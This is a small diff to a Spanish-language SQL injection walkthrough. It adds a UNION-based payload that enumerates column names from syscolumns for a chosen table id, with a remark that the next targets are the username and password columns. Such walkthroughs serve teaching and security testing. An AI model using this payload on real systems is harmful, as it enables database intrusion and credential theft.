@@ -148,6 +148,11 @@ En el valor 3 sacaremos el Id de la tabla de usuarios
 ```
 
 y ahora sacaremos el valor de esta tabla con identificador `901578250`
+```sql
+'union select 1,name,3,4,5,6  from syscolumns where id = 901578250;--
+```
+
+Ahora vamos a listar el contenido de las columnas que encontramos los que mas nos interesan son `username` y `password`
 
 
 
